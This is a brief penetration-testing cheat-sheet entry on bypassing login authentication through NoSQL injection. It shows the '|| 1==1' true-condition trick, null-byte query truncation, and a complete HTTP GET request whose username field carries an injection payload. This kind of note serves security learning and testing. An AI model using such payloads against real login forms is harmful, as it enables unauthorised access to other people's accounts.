# Authentication bypass

## Authentication bypass \(NoSQL injection\)

* classic true statement like ' or 1=1 -- - is replaced by \|\| 1==1.
* Null byte \(ie %00 can replace // or &lt;!-- to comment out the end of the query \)

**Example :**

Query = `GET /?username=test&password=test&submit=Submit+Query HTTP/1.1`

* Injection ' \|\| 1==1

`GET /?username=admin'%7c%7c+polo==polo%00&password=test&submit=Submit+Query HTTP/1.1`

